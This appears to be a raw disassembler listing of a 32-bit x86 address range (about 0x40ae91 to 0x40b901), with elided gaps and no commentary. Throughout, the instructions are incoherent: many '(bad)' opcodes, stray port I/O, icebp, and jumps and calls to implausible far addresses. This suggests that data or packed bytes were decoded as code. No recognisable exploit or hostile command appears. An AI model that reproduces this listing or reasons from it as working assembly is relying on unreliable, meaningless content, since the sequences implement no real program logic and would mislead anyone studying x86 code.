  40ae91:	jmp    0xe9ce8dd4
	...
  40aebe:	add    BYTE PTR [eax],al
  40aec0:	cmp    eax,0x955c835b
  40aec5:	in     al,dx
  40aec6:	(bad)  
  40aec7:	xchg   esi,eax
  40aec8:	cmp    eax,0x3d688464
  40aecd:	pop    ebx
  40aece:	add    BYTE PTR [eax],al
  40aed0:	das    
  40aed1:	out    dx,eax
  40aed2:	(bad)  
  40aed3:	out    dx,al
  40aed4:	adc    DWORD PTR [ebx+0x24bf0875],ecx
  40aeda:	mov    al,0xff
  40aedc:	push   eax
  40aedd:	mov    esi,DWORD PTR [ebp-0x74e714]
  40aee3:	dec    DWORD PTR [edx-0x392f1910]
  40aee9:	mov    edi,edi
  40aeeb:	dec    edx
  40aeed:	nop
  40aeee:	idiv   edi
  40aef0:	add    BYTE PTR [ebx-0x6210f78b],cl
  40aef6:	mov    cl,0xff
  40aef8:	push   eax
  40aef9:	mov    esi,DWORD PTR [ebp-0x74b71c]
  40aeff:	(bad)  
  40af00:	(bad)  
  40af02:	out    0xb4,al
  40af04:	push   ss
  40af05:	mov    edi,edi
  40af07:	dec    DWORD PTR [edx]
  40af09:	inc    esp
  40af0a:	idiv   edi
  40af0c:	xor    BYTE PTR [ebx+0x1c2f0875],cl
  40af12:	mov    al,0xff
  40af14:	push   eax
  40af15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af16:	mov    ch,0xe0
  40af18:	dec    eax
  40af19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af1a:	(bad)  
  40af1b:	dec    edx
  40af1d:	out    dx,eax
  40af1e:	out    0x98,al
  40af20:	(bad)  
  40af21:	mov    ds:0x83ff,eax
	...
  40af4e:	rol    BYTE PTR [esi-0x9],cl
  40af51:	call   DWORD PTR [eax]
  40af53:	pop    edi
  40af54:	je     0x40af71
  40af56:	xchg   esp,eax
  40af57:	retf   0xf7cf
  40af5a:	add    BYTE PTR [esp+eax*1-0x7a8f0a8b],ah
  40af61:	fmul   st,st(0)
  40af63:	mov    ds:0xa507ffff,eax
  40af68:	jne    0x40af72
  40af6a:	iret   
  40af6b:	repnz scas eax,DWORD PTR es:[edi]
  40af6d:	call   eax
  40af6f:	(bad)
  40af73:	add    cl,BYTE PTR [esi+0x75]
  40af76:	ss (bad) 
  40af79:	mov    al,0xd9
  40af7b:	fmul   QWORD PTR [esi-0x4b]
  40af7e:	fisubr DWORD PTR [edi+ecx*2-0x1]
  40af82:	(bad)  
  40af83:	cmp    eax,0x84c1ff98
  40af88:	cdq    
  40af89:	in     al,dx
  40af8a:	mov    cl,0x7c
  40af8c:	dec    edi
  40af8d:	call   0xff8f7d91
  40af92:	test   eax,0xa1f75bd6
  40af97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af98:	pop    esp
  40af99:	rcr    BYTE PTR ss:[edi+ecx*2+0x57a1cbff],cl
  40afa1:	dec    DWORD PTR [ecx-0x7e4be467]
  40afa7:	inc    esp
  40afa8:	dec    edi
  40afa9:	mov    ch,0x96
  40afab:	push   esp
  40afac:	dec    edi
  40afad:	jmp    DWORD PTR [esi+0x21]
  40afb0:	xchg   edi,eax
  40afb1:	inc    DWORD PTR [eax]
	...
  40afdb:	add    BYTE PTR [ecx+0x4c],ch
  40afde:	cdq    
  40afdf:	lock imul esp,DWORD PTR [edi+ecx*2-0x18],0xff4f3633
  40afe8:	push   ecx
  40afe9:	mov    esi,0xee73e94a
  40afee:	dec    ebp
  40afef:	inc    DWORD PTR [ecx+0x6e]
  40aff2:	dec    edi
  40aff3:	call   0x439467
  40aff8:	pop    es
  40aff9:	(bad)  
  40affa:	cli    
  40affb:	call   DWORD PTR [edx-0x57ca083]
  40b001:	and    cl,bl
  40b003:	jmp    DWORD PTR [edi+0x46754de7]
  40b009:	or     al,0x26
  40b00b:	mov    cl,0x9
  40b00d:	stos   BYTE PTR es:[edi],al
  40b00e:	jnp    0x40b055
  40b010:	add    bl,BYTE PTR [ebp+0x5b7f57f6]
  40b016:	jmp    0x91a41b69
  40b01b:	shr    dl,1
  40b01d:	repnz xchg ebp,eax
  40b01f:	dec    esi
  40b020:	imul   ebp,edi,0xffffff8d
  40b023:	fadd   DWORD PTR [ecx+0x3]
  40b026:	sbb    edx,DWORD PTR [ebp+0x41aff2d1]
  40b02c:	inc    edx
  40b02d:	pop    ebx
  40b02e:	sbb    al,0x7b
  40b030:	rcr    ah,cl
  40b032:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b033:	aas    
  40b034:	mov    cl,0xf2
  40b036:	gs cmp bl,0xee
  40b03a:	mov    eax,0x565f334e
  40b03f:	sbb    BYTE PTR [eax],al
	...
  40b069:	add    BYTE PTR [ebx-0x59fc575d],cl
  40b06f:	cli    
  40b070:	add    edi,DWORD PTR gs:[esi]
  40b073:	sub    si,di
  40b076:	ret    0xeb92
  40b079:	add    edi,DWORD PTR [esi]
  40b07b:	sbb    ah,BYTE PTR [ebx+ecx*2+0x3e95b3e]
  40b082:	jns    0x40b01c
  40b084:	adc    eax,0xe95b414e
  40b089:	fldenv [ecx-0x7c]
  40b08c:	jmp    0xe9c50a6a
  40b091:	cmp    bl,0xe6
  40b094:	cwde   
  40b095:	add    bl,0xe7
  40b098:	std    
  40b099:	dec    ebp
  40b09a:	inc    ecx
  40b09b:	mov    ebp,esi
  40b09d:	xlat   BYTE PTR ds:[ebx]
  40b09e:	xor    edx,esi
  40b0a0:	pop    ebx
  40b0a1:	push   eax
  40b0a2:	es mov ah,0x7d
  40b0a5:	add    al,0x3e
  40b0a7:	test   ax,0x3ad8
  40b0ab:	add    al,0xb
  40b0ad:	add    bh,BYTE PTR [esi]
  40b0af:	pop    ebx
  40b0b0:	push   ecx
  40b0b1:	xchg   ebx,eax
  40b0b2:	xchg   BYTE PTR [ecx+ebp*8+0x5f934c],bl
  40b0b9:	rol    DWORD PTR [ecx+ebp*4],0xfe
  40b0bd:	scas   al,BYTE PTR es:[edi]
  40b0be:	ja     0x40b0cb
  40b0c0:	lea    ebp,[esi+edx*4-0x16]
  40b0c4:	(bad)  
  40b0c5:	sahf   
  40b0c6:	mov    dl,0x8b
  40b0c8:	call   0xff327bf3
  40b0cd:	pusha  
	...
  40b0f6:	add    BYTE PTR [eax],al
  40b0f8:	shr    edx,0xf6
  40b0fb:	xchg   BYTE PTR [ebx+0x73ad84e0],al
  40b101:	repnz (bad) 
  40b103:	sbb    edx,esp
  40b105:	pop    ds
  40b106:	pop    eax
  40b107:	sub    BYTE PTR [edx-0xe],al
  40b10a:	mov    ah,0x59
  40b10c:	or     esi,edx
  40b10e:	(bad)  
  40b10f:	pop    esi
  40b110:	push   ecx
  40b111:	or     BYTE PTR [eax-0x58],cl
  40b114:	cmp    eax,0xb975103
  40b119:	repnz mov BYTE PTR [esi+eiz*1-0x16],ch
  40b11e:	(bad)  
  40b11f:	ds fs icebp 
  40b122:	dec    bp
  40b124:	rcr    BYTE PTR [edx-0x152ed200],cl
  40b12a:	mul    BYTE PTR [esi]
  40b12c:	add    esi,edx
  40b12e:	xor    al,0x34
  40b130:	stos   BYTE PTR es:[edi],al
  40b131:	call   0xefe:0xa94f0100
  40b138:	aad    0xd7
  40b13a:	jmp    0x40b13a
  40b13c:	add    dh,dl
  40b13e:	imul   ebp,ecx,0xa8580265
  40b144:	cmp    eax,0x92f9b4f2
  40b149:	lock (bad) 
  40b14b:	out    0x48,al
  40b14d:	push   es
  40b14e:	dec    eax
  40b14f:	sub    BYTE PTR [edx+0x3],al
  40b152:	adc    eax,0x88f0729f
  40b157:	fs jne 0x40b142
  40b15a:	inc    BYTE PTR [eax]
	...
  40b184:	add    BYTE PTR [eax],al
  40b186:	clc    
  40b187:	adc    bh,bh
  40b189:	addr16 rol esp,cl
  40b18c:	aas    
  40b18d:	add    al,cl
  40b18f:	leave  
  40b190:	out    dx,eax
  40b191:	imul   DWORD PTR [eax-0x4dca0061]
  40b197:	mov    ah,0x3f
  40b199:	add    bh,cl
  40b19b:	xchg   DWORD PTR [ebp-0x7a8a3701],esi
  40b1a1:	loopne 0x40b153
  40b1a3:	lahf   
  40b1a4:	dec    DWORD PTR [ebp-0x8bb9e]
  40b1aa:	dec    eax
  40b1ab:	lods   al,BYTE PTR ds:[esi]
  40b1ac:	out    dx,ax
  40b1ae:	das    
  40b1af:	sbb    al,0xff
  40b1b1:	(bad)  
  40b1b2:	jb     0x40b140
  40b1b4:	idiv   edi
  40b1b6:	sbb    BYTE PTR [edi+0x1defd535],bl
  40b1bc:	jmp    edi
  40b1be:	arpl   cx,cx
  40b1c0:	(bad)  
  40b1c1:	call   FWORD PTR [esp+ebx*4-0x1edbec8c]
  40b1c8:	xlat   BYTE PTR ds:[ebx]
  40b1c9:	test   DWORD PTR [eax-0x61],0x9f9d7504
  40b1d0:	xor    BYTE PTR [edi-0x8c01e],cl
  40b1d6:	sbb    BYTE PTR [ebx+0x3fe2c70a],dl
  40b1dc:	idiv   edi
  40b1de:	dec    eax
  40b1df:	jmp    0xaca8b1e2
  40b1e4:	out    0x95,al
  40b1e6:	adc    eax,0x8dff9f
	...
  40b213:	add    dl,ah
  40b215:	sub    esi,edi
  40b217:	dec    DWORD PTR [eax-0x53]
  40b21a:	data16 xlat BYTE PTR ds:[ebx]
  40b21c:	iret   
  40b21d:	sbb    al,0xff
  40b21f:	(bad)  
  40b220:	rol    BYTE PTR [esi-0x5bf70009],cl
  40b226:	xor    eax,0xc53a3ed5
  40b22b:	jmp    DWORD PTR [ecx]
  40b22d:	jb     0x40b1c0
  40b22f:	call   DWORD PTR [ecx]
  40b231:	in     eax,dx
  40b232:	inc    edx
  40b233:	je     0x40b262
  40b235:	test   DWORD PTR [ecx+0x4aa909d0],ecx
  40b23b:	add    al,0x73
  40b23d:	cld    
  40b23e:	dec    ecx
  40b23f:	xor    cl,al
  40b241:	jle    0x40b273
  40b243:	imul   ecx
  40b245:	rcr    BYTE PTR [esi+0xa],1
  40b248:	stc    
  40b249:	jle    0x40b27b
  40b24b:	neg    ecx
  40b24d:	loopne 0x40b252
  40b24f:	add    BYTE PTR [esi],bh
  40b251:	add    dh,BYTE PTR [ebx+0x4b346fe7]
  40b257:	(bad)  
  40b258:	mov    ebp,0xb9f76026
  40b25d:	add    BYTE PTR [esp+esi*2],0x71
  40b261:	test   DWORD PTR [ecx+0x4b90b1d4],ecx
  40b267:	add    ch,BYTE PTR [ebx]
  40b269:	push   eax
  40b26a:	fdivp  st(7),st
  40b26c:	retf   0x3876
  40b26f:	not    DWORD PTR [ecx-0x2c014b68]
  40b275:	xchg   ebp,eax
  40b276:	push   ebx
  40b277:	inc    DWORD PTR [eax]
	...
  40b2a1:	add    BYTE PTR [ecx+0x79db9c99],al
  40b2a7:	inc    eax
  40b2a8:	(bad)  
  40b2a9:	mov    edi,0xbd85eaea
  40b2ae:	jp     0x40b2f8
  40b2b0:	dec    ebx
  40b2b1:	(bad)  
  40b2b2:	ds iret 
  40b2b4:	out    dx,eax
  40b2b5:	(bad)  
  40b2b6:	xchg   ebx,eax
  40b2b7:	push   ebp
  40b2b8:	push   ebx
  40b2b9:	call   DWORD PTR [ecx+0x49]
  40b2bc:	div    DWORD PTR [ecx-0x7abe0fb7]
  40b2c2:	pop    edx
  40b2c3:	lock dec ecx
  40b2c5:	(bad)  
  40b2c6:	ds add al,0x3
  40b2c9:	add    BYTE PTR [ebp+0x315fa45b],bh
  40b2cf:	out    dx,eax
  40b2d0:	fld    QWORD PTR [ebx]
  40b2d2:	stos   BYTE PTR es:[edi],al
  40b2d3:	sub    BYTE PTR [edx-0x78],0x2a
  40b2d7:	out    0xcd,eax
  40b2d9:	dec    edx
  40b2da:	ds addr16 dec ebx
  40b2dd:	xchg   ebx,ecx
  40b2df:	add    esi,DWORD PTR [esi+0x3d5c014a]
  40b2e5:	lods   eax,DWORD PTR ds:[esi]
  40b2e6:	popa   
  40b2e7:	pop    ecx
  40b2e8:	jmp    0x1c2f6347
  40b2ed:	cld    
  40b2ee:	loope  0x40b2b9
  40b2f0:	dec    esi
  40b2f1:	dec    edx
  40b2f2:	loope  0x40b2e2
  40b2f4:	pop    ebx
  40b2f5:	push   edi
  40b2f6:	shr    esi,1
  40b2f8:	lea    ecx,[edx+0x4b]
  40b2fb:	arpl   WORD PTR [ecx+0x7dee9861],dx
  40b301:	dec    edx
  40b302:	mov    eax,DWORD PTR [ebx]
  40b304:	jle    0x40b350
	...
  40b32e:	add    BYTE PTR [eax],al
  40b330:	mov    ecx,0x99fbf3ee
  40b335:	adc    edx,DWORD PTR [edi-0x6c1156b6]
  40b33b:	aaa    
  40b33c:	test   eax,0xd34a55ee
  40b341:	not    DWORD PTR [ebp+0x4a]
  40b344:	xchg   ecx,eax
  40b345:	out    dx,al
  40b346:	mov    ebx,0x8ed3a1fb
  40b34b:	dec    edx
  40b34c:	sub    esi,0xee71277b
  40b352:	sub    eax,0x1162eb4a
  40b357:	scas   eax,DWORD PTR es:[edi]
  40b358:	fwait
  40b359:	out    dx,al
  40b35a:	sbb    eax,0x1dfbab4a
  40b35f:	dec    edx
  40b360:	pop    ecx
  40b361:	out    dx,al
  40b362:	xchg   ebx,eax
  40b363:	sti    
  40b364:	pop    ecx
  40b365:	ret    
  40b366:	push   esi
  40b367:	dec    edx
  40b368:	dec    ecx
  40b369:	out    dx,al
  40b36a:	xor    ebx,DWORD PTR [edi+0x49]
  40b36d:	out    dx,al
  40b36e:	push   ebp
  40b370:	xchg   esp,eax
  40b371:	loope  0x40b323
  40b373:	out    dx,al
  40b374:	xchg   esi,ebp
  40b376:	mov    ah,0xd5
  40b378:	(bad)  
  40b379:	out    dx,al
  40b37a:	(bad)  
  40b37b:	shl    edi,1
  40b37d:	stos   BYTE PTR es:[edi],al
  40b37e:	(bad)  
  40b37f:	(bad)  
  40b380:	xchg   DWORD PTR [eax-0x11782919],ebp
  40b386:	out    0x3d,eax
  40b388:	lods   eax,DWORD PTR ds:[esi]
  40b389:	in     eax,dx
  40b38a:	(bad)  
  40b38b:	mov    esi,0xb6f6fab1
  40b390:	xchg   DWORD PTR [ebx],eax
  40b392:	imul   edi,DWORD PTR [eax+0x0],0x0
	...
  40b3bd:	add    BYTE PTR [edi-0x6da30112],al
  40b3c3:	out    0xfe,al
  40b3c5:	sahf   
  40b3c6:	or     BYTE PTR [ebp-0x1178694f],0x44
  40b3cd:	xchg   ecx,eax
  40b3ce:	jne    0x40b37b
  40b3d0:	cld    
  40b3d1:	xchg   BYTE PTR [edi-0x12],dh
  40b3d4:	je     0x40b453
  40b3d6:	bound  esi,QWORD PTR [ecx-0x63]
  40b3d9:	jmp    0xe202d81b
  40b3de:	cmp    eax,0xc3558b88
  40b3e3:	push   ss
  40b3e4:	hlt    
  40b3e5:	sar    DWORD PTR ds:0x89560e81,cl
  40b3eb:	push   ebp
  40b3ec:	call   0xff2e6bca
  40b3f1:	jo     0x40b3bc
  40b3f3:	icebp  
  40b3f4:	addr16 jmp 0xc1feb237
  40b3fa:	lods   eax,DWORD PTR ds:[esi]
  40b3fb:	test   DWORD PTR [ecx-0x17],eax
  40b3fe:	xchg   ebp,eax
  40b3ff:	mov    ds,WORD PTR [eax-0x58]
  40b402:	cmp    eax,0x5f174ee
  40b407:	xchg   edx,eax
  40b408:	ficom  DWORD PTR [esi]
  40b40a:	pop    es
  40b40b:	loopne 0x40b451
  40b40d:	adc    DWORD PTR [edx-0x60ff588b],ecx
  40b413:	sbb    bh,bh
  40b415:	lods   al,BYTE PTR ds:[si]
  40b417:	sar    DWORD PTR [edi],0x0
  40b41a:	xor    BYTE PTR [esi-0x2b],bl
  40b41d:	dec    eax
  40b41e:	out    0x58,al
  40b420:	call   0x40b442
	...
  40b449:	add    BYTE PTR [eax],al
  40b44b:	add    bl,cl
  40b44d:	mov    ds:0x1cd70bff,eax
  40b452:	and    eax,0x688b6a89
  40b457:	add    DWORD PTR [edi],esp
  40b459:	xchg   esp,eax
  40b45a:	mov    esi,0xe6ef4aff
  40b45f:	mov    ds:0xffffa3b2,al
  40b464:	cmp    bl,BYTE PTR [edi-0x5c548a01]
  40b46a:	jne    0x40b474
  40b46c:	iret   
  40b46d:	lods   eax,DWORD PTR cs:[esi]
  40b46f:	inc    eax
  40b471:	mov    ds:0x3fbff475,eax
  40b476:	mov    al,0xff
  40b478:	rcl    BYTE PTR [eax],0xae
  40b47b:	pop    eax
  40b47c:	push   ss
  40b47d:	push   edi
  40b47e:	push   DWORD PTR [ebp-0x31]
  40b481:	nop
  40b482:	(bad)  
  40b483:	cld    
  40b484:	xor    BYTE PTR [ebx-0x5cdc8a01],ah
  40b48a:	jne    0x40b494
  40b48c:	nop    DWORD PTR [ebp-0x3dceff01]
  40b493:	add    al,0xa7
  40b495:	mov    ebp,0x2c24ec89
  40b49a:	cld    
  40b49b:	push   0xffffff97
  40b49d:	push   cs
  40b49e:	push   cs
  40b49f:	dec    edx
  40b4a1:	lock out 0xe5,al
  40b4a4:	ret    0xffa3
  40b4a7:	mov    DWORD PTR [edx+0x57006894],ebx
  40b4ad:	xchg   ebx,eax
  40b4ae:	mov    esi,0x68
	...
  40b4d7:	add    BYTE PTR [eax],al
  40b4d9:	add    BYTE PTR [edi-0x3f],dl
  40b4dc:	aas    
  40b4dd:	add    BYTE PTR [esi],bh
  40b4df:	(bad)  
  40b4e1:	pop    eax
  40b4e2:	inc    DWORD PTR [ecx]
  40b4e4:	dec    eax
  40b4e5:	jne    0x40b51d
  40b4e7:	dec    edx
  40b4e8:	xor    ebx,ecx
  40b4ea:	inc    ecx
  40b4eb:	in     eax,dx
  40b4ec:	inc    esi
  40b4ed:	jne    0x40b529
  40b4ef:	in     eax,0xcc
  40b4f1:	pop    es
  40b4f2:	es hlt 
  40b4f4:	cwde   
  40b4f5:	jmp    FWORD PTR [ecx]
  40b4f7:	stos   DWORD PTR es:[edi],eax
  40b4f8:	inc    ecx
  40b4f9:	add    al,0x3e
  40b4fb:	daa    
  40b4fc:	jnp    0x40b4ea
  40b4fe:	mov    ebp,0x3e6a47bd
  40b503:	cwde   
  40b504:	hlt    
  40b505:	(bad)  
  40b506:	xchg   ebx,eax
  40b507:	jmp    0x8946:0xacd3aa5a
  40b50e:	and    DWORD PTR [esi-0x530e0025],0xffffff85
  40b515:	push   0xffc59b50
  40b51a:	pop    ecx
  40b51b:	pop    ecx
  40b51c:	lods   eax,DWORD PTR ds:[esi]
  40b51d:	inc    eax
  40b51e:	(bad)
  40b522:	out    0x66,al
  40b524:	sub    eax,0x447c9ff
  40b529:	push   0xffc53b66
  40b52e:	and    DWORD PTR [ebx+ebp*4+0x117d3e40],esp
  40b535:	aad    0xf6
  40b537:	ret    0xe802
  40b53a:	pop    es
  40b53b:	rol    DWORD PTR [esi-0x1],1
	...
  40b566:	add    BYTE PTR [eax],al
  40b568:	inc    ebp
  40b569:	inc    edx
  40b56a:	shl    BYTE PTR [ebx],1
  40b56c:	es inc esi
  40b56e:	lods   eax,DWORD PTR ds:[esi]
  40b56f:	inc    eax
  40b570:	rcr    BYTE PTR ds:[edx+0x25],cl
  40b574:	retf   0x472c
  40b577:	push   eax
  40b578:	out    0x1,al
  40b57a:	add    ebp,edi
  40b57c:	mov    al,0x19
  40b57e:	in     eax,dx
  40b57f:	pop    eax
  40b580:	call   FWORD PTR [edx-0x17]
  40b583:	mov    bl,0x60
  40b585:	gs icebp 
  40b587:	pop    ebx
  40b588:	adc    dl,BYTE PTR cs:[esi]
  40b58b:	inc    edi
  40b58c:	push   cx
  40b58e:	pop    ecx
  40b58f:	inc    edi
  40b590:	dec    ecx
  40b591:	jmp    0x40b60e
  40b593:	inc    edi
  40b594:	inc    ecx
  40b595:	gs icebp 
  40b597:	pop    ebx
  40b598:	retf   0xf5b8
  40b59b:	inc    esi
  40b59c:	pop    es
  40b59d:	push   ds
  40b59e:	in     eax,0x3
  40b5a0:	xchg   ebx,eax
  40b5a1:	(bad)  
  40b5a2:	aam    0x82
  40b5a4:	cli    
  40b5a5:	out    0x36,eax
  40b5a7:	scas   eax,DWORD PTR es:[edi]
  40b5a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5a9:	pop    ebx
  40b5aa:	inc    ebx
  40b5ab:	cmc    
  40b5ac:	adc    BYTE PTR [ecx-0x1f],dh
  40b5af:	pop    ebx
  40b5b0:	pop    eax
  40b5b1:	mov    eax,0xa0b746c5
  40b5b6:	mov    ebp,0x2184337a
  40b5bb:	vpmullw xmm5,xmm1,xmm3
  40b5bf:	test   al,0x81
  40b5c1:	pushf  
  40b5c2:	jmp    0x159bd74a
  40b5c7:	mov    ebx,0xc5307f61
	...
  40b5f4:	add    BYTE PTR [eax],al
  40b5f6:	rcl    DWORD PTR [ecx+0x5ba5ba81],1
  40b5fc:	jmp    0xc4b037fb
  40b601:	lods   eax,DWORD PTR ds:[esi]
  40b602:	mov    eax,ds:0xb1462fca
  40b607:	jae    0x40b605
  40b609:	lods   al,BYTE PTR ds:[esi]
  40b60a:	(bad)  
  40b60b:	pop    edx
  40b60c:	mov    ecx,0x5daeeb5b
  40b611:	inc    esi
  40b612:	out    dx,al
  40b613:	jb     0x40b5fe
  40b615:	add    esp,DWORD PTR [ecx+0x1346b8a9]
  40b61b:	push   ebx
  40b61c:	push   ecx
  40b61d:	inc    ebx
  40b61e:	imul   ebp,edx,0x3d
  40b621:	pop    ebx
  40b622:	test   al,0xba
  40b624:	push   DWORD PTR ds:0xa700f5f8
  40b62a:	mov    ebp,0xf79c0029
  40b62f:	mov    al,ds:0xa3fddafc
  40b634:	(bad)  
  40b635:	push   ss
  40b636:	clc    
  40b637:	jmp    0x6275f62d
  40b63c:	jne    0x40b67a
  40b63e:	clc    
  40b63f:	outs   dx,DWORD PTR ds:[esi]
  40b640:	cld    
  40b641:	dec    BYTE PTR [ecx]
  40b643:	(bad)  
  40b644:	call   0xff2a8d2c
  40b649:	mov    fs,ebx
  40b64b:	adc    al,dl
  40b64d:	in     eax,dx
  40b64e:	cmp    eax,0xbfcd8b90
  40b653:	push   ds
  40b654:	cld    
  40b655:	inc    ebx
  40b656:	cmp    dh,BYTE PTR [ebp+0x12]
  40b659:	into   
	...
  40b682:	add    BYTE PTR [eax],al
  40b684:	stc    
  40b685:	popa   
  40b686:	call   0xff2a5d20
  40b68b:	jo     0x40b646
  40b68d:	in     eax,0x67
  40b68f:	jmp    0x41feb0d1
  40b694:	mov    ebp,0x5e94183
  40b699:	jb     0x40b6f4
  40b69b:	sub    BYTE PTR [edx-0x16],al
  40b69e:	je     0x40b681
  40b6a0:	jne    0x40b674
  40b6a2:	xlat   BYTE PTR ds:[ebx]
  40b6a3:	mov    es,WORD PTR [ebx+0x7b8574ea]
  40b6a9:	jo     0x40b6b3
  40b6ab:	xchg   ecx,eax
  40b6ac:	jno    0x40b665
  40b6ae:	(bad)  
  40b6af:	jbe    0x40b726
  40b6b1:	sbb    eax,0xd4d8e904
  40b6b6:	jmp    0x40b720
  40b6b8:	inc    BYTE PTR [esi]
  40b6ba:	neg    DWORD PTR [esi+0x3]
  40b6bd:	fadd   DWORD PTR [ebp+edx*2-0x36]
  40b6c1:	call   0x3043943a
  40b6c6:	aad    0x0
  40b6c8:	iret   
  40b6c9:	sbb    al,0xff
  40b6cb:	out    0x85,eax
  40b6cd:	jb     0x40b6cf
  40b6cf:	add    BYTE PTR [ebp+ebx*4+0xf],bl
  40b6d3:	test   DWORD PTR [esi+0x1000005d],esi
  40b6d9:	stos   BYTE PTR es:[edi],al
  40b6da:	test   BYTE PTR [eax],0x67
  40b6dd:	pop    ebp
  40b6de:	add    bh,al
  40b6e0:	mov    ds:0x5707ff99,al
  40b6e5:	pop    ebp
  40b6e6:	push   0x0
	...
  40b710:	add    BYTE PTR [eax],al
  40b712:	lods   eax,DWORD PTR ds:[esi]
  40b713:	pop    ebp
  40b714:	push   0x0
  40b716:	int    0x5c
  40b718:	lea    eax,[ebp+0x33]
  40b71b:	lods   eax,DWORD PTR ds:[esi]
  40b71c:	mov    eax,DWORD PTR [ebp-0x67cd]
  40b722:	addr16 sahf 
  40b724:	jne    0x40b71e
  40b726:	clc    
  40b727:	sbb    ebx,edi
  40b729:	call   0x412961
  40b72e:	sbb    al,0x9d
  40b730:	je     0x40b737
  40b732:	out    dx,al
  40b733:	or     BYTE PTR [eax],al
  40b735:	add    bh,ah
  40b737:	add    al,0xb0
  40b739:	dec    eax
  40b73a:	es pop edi
  40b73c:	push   DWORD PTR [ebp+0xb]
  40b73f:	test   DWORD PTR [ebp+0x509f98b2],eax
  40b745:	mov    edx,DWORD PTR [edi-0x4f0b7a8f]
  40b74b:	lahf   
  40b74c:	call   DWORD PTR [eax+0x5]
  40b74f:	xchg   DWORD PTR [ebp-0x4e],esi
  40b752:	mov    eax,0x3785899f
  40b757:	xchg   edi,eax
  40b758:	(bad)  
  40b759:	(bad)  
  40b75a:	mov    edi,0x18ffae23
  40b75f:	add    bh,bh
  40b761:	addr16 mov ecx,0xf8003fb5
  40b767:	fsubr  st,st(7)
  40b769:	idiv   DWORD PTR [esi]
  40b76b:	xchg   ecx,eax
  40b76c:	inc    esp
  40b76d:	call   DWORD PTR [ebx+0x2f]
  40b770:	mov    ebx,0x388a3e40
  40b775:	mov    cl,0x0
	...
  40b79f:	add    BYTE PTR [ecx+0x29],bh
  40b7a2:	jp     0x40b729
  40b7a4:	pop    edx
  40b7a5:	sub    DWORD PTR [edi+edi*8-0x2c],eax
  40b7a9:	icebp  
  40b7aa:	fimul  DWORD PTR [ebp-0xfd4cf9]
  40b7b0:	xchg   ebx,eax
  40b7b1:	inc    edx
  40b7b2:	dec    esp
  40b7b3:	call   DWORD PTR [ecx+0x51]
  40b7b6:	push   cs
  40b7b7:	aad    0xf6
  40b7b9:	mov    dl,0x2
  40b7bb:	call   0xff84db53
  40b7c0:	(bad)  
  40b7c1:	jle    0x40b81a
  40b7c3:	div    DWORD PTR [ecx]
  40b7c5:	icebp  
  40b7c6:	xlat   BYTE PTR ds:[ebx]
  40b7c7:	jmp    DWORD PTR [ecx+0x3e40aa8f]
  40b7cd:	add    DWORD PTR [ecx-0x10],edi
  40b7d0:	adc    DWORD PTR [ecx],ecx
  40b7d2:	inc    ebx
  40b7d3:	dec    DWORD PTR [ebx-0x59]
  40b7d6:	retf   
  40b7d7:	inc    eax
  40b7d8:	sbb    dl,BYTE PTR ds:[ebx-0x72defe4f]
  40b7df:	test   esi,esp
  40b7e1:	mov    al,0x42
  40b7e3:	inc    ebx
  40b7e5:	jbe    0x40b847
  40b7e7:	imul   ecx
  40b7e9:	mov    eax,0x9a9967d3
  40b7ee:	(bad)  
  40b7f1:	mov    ?,WORD PTR [edi+esi*8]
  40b7f4:	rcl    eax,1
  40b7f6:	inc    edx
  40b7f7:	xor    eax,0xffc539f3
  40b7fc:	(bad)  [ebp+0x75]
  40b7ff:	(bad)  
  40b800:	mov    ecx,0x7442ec
	...
  40b82d:	add    BYTE PTR [edi+0x75],dl
  40b830:	sbb    esp,0x44378b1
  40b836:	sub    ebx,DWORD PTR [ebx-0x7]
  40b839:	inc    edx
  40b83a:	dec    esi
  40b83b:	fsub   DWORD PTR [ebx+0x24]
  40b83e:	mov    edi,esp
  40b840:	push   ebp
  40b841:	aam    0xa1
  40b843:	and    DWORD PTR [edi+0x43],edi
  40b846:	xor    ebx,0x6e7e0edc
  40b84c:	out    0xd3,eax
  40b84e:	pop    ecx
  40b84f:	xor    eax,0x1f694387
  40b854:	fs and al,0x69
  40b857:	out    0x25,eax
  40b859:	sbb    DWORD PTR [esi],edi
  40b85b:	pop    ebx
  40b85c:	jmp    0x1e3f4be7
  40b861:	inc    ebx
  40b862:	dec    ecx
  40b863:	pop    edx
  40b864:	xchg   ebp,eax
  40b865:	fidivr DWORD PTR [ebp+eiz*4-0x18c6c4ec]
  40b86c:	call   0x341b3c28
  40b871:	sub    al,0x31
  40b873:	out    0xed,eax
  40b875:	add    ebp,DWORD PTR [edx+0x3e0451a0]
  40b87b:	neg    BYTE PTR [esi-0x3eac74be]
  40b881:	outs   dx,DWORD PTR ds:[esi]
  40b882:	aam    0xe6
  40b884:	int    0x42
  40b886:	retf   
  40b887:	idiv   DWORD PTR [ebp+0x33e6f942]
  40b88d:	or     al,0xe6
  40b88f:	pop    ebx
  40b890:	add    BYTE PTR [edx+0x0],0x0
	...
  40b8bc:	jmp    0xe96c2ca7
  40b8c1:	out    0xa5,al
  40b8c3:	inc    edx
  40b8c4:	push   ebx
  40b8c5:	push   ebx
  40b8c6:	xchg   ecx,eax
  40b8c7:	xor    eax,0x4295e6a4
  40b8cc:	xchg   ebx,eax
  40b8cd:	call   DWORD PTR [ebp-0x4193ebe]
  40b8d3:	or     esp,DWORD PTR [esi-0x4ebdad01]
  40b8d9:	out    0xff,al
  40b8db:	cmp    ebx,DWORD PTR [ebp-0x12]
  40b8de:	(bad)  
  40b8df:	outs   dx,BYTE PTR ds:[esi]
  40b8e0:	cld    
  40b8e1:	outs   dx,DWORD PTR ds:[esi]
  40b8e2:	or     BYTE PTR [ecx-0x2f],dl
  40b8e5:	mov    ah,0xfe
  40b8e7:	pop    esi
  40b8e8:	cld    
  40b8e9:	scas   eax,DWORD PTR es:[edi]
  40b8ea:	jecxz  0x40b94a
  40b8ec:	cld    
  40b8ed:	in     eax,0xe7
  40b8ef:	xchg   ecx,eax
  40b8f0:	push   cs
  40b8f1:	out    0xfe,al
  40b8f3:	inc    esi
  40b8f4:	div    dh
  40b8f6:	idiv   BYTE PTR [esi]
  40b8f8:	cld    
  40b8f9:	repnz lods al,BYTE PTR ds:[esi]
  40b8fb:	test   ah,bh
  40b8fd:	in     eax,0xfe
  40b8ff:	je     0x40b916
  40b901:	out    dx,al
